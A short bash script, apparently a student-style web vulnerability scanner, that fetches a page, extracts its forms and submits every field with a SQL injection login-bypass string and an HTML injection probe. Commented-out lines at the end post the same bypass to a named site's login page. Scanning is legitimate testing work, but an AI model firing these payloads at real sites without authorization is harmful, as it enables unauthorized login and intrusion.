#!/bin/bash
# Louis Shropshire
# main.sh - Runs the Vulnerability scan

if [ $# -ne 1 ]
then
	>&2 echo "Invalid number of arguments"
	exit;
fi
#Check if its a valid url

wget $1 --output-document=tmp.html --quiet

FORMDATA=`awk -f find_form.awk tmp.html`
SQLVALUE="' OR 1=1 OR ''='"
XSSVALUE="<u><b>INJECTION TIME</b></u>"
LINENUM=0
while read line 
do
	n=$((LINENUM % 3))
	if [ $n -eq 0 ] 
	then
		ACTION=$line

		if [ $ACTION == "default" ]
		then
			ACTION=$1
		elif [ ${ACTION:0:1} == "/" ]
		then
			ACTION=$1$ACTION
		fi
		echo $ACTION
	fi
	if [ $n -eq 1 ] 
	then
		METHOD=$line
		echo $METHOD
	fi
	if [ $n -eq 2 ] 
	then
		FIELDSLINE=$line
		echo $line
		fields=(${line//\^~\^/ })

		SQLIDATA=""
		XSSIDATA=""
		for field in "${fields[@]}"
		do
			SQLIDATA="$SQLIDATA$field=$SQLVALUE&"
			XSSIDATA="$XSSIDATA$field=$XSSVALUE&"
		done

		if [ $METHOD == "post" ] 
		then
			wget $ACTION --post-data="$SQLIDATA" --output-document=sqli.tmp
			wget $ACTION --post-data="$XSSIDATA" --output-document=xssi.tmp
		else 
			wget "$ACTION?$SQLIDATA" --output-document=tmpsqli.tmp
			wget "$ACTION?$XSSIDATA" --output-document=xssi.tmp
		fi
	fi

	((LINENUM++)) 
done <<< "$FORMDATA"


#wget --post-data="un=$USERNAME&pw=$PASSWORD&submit=1" \
#http://recck.com/topics/test/login.php

rm tmp.html

#wget --post-data="un=' OR 1=1 OR ''='&pw=' OR 1=1 OR ''='&submit=1" \
#http://recck.com/topics/test/login.php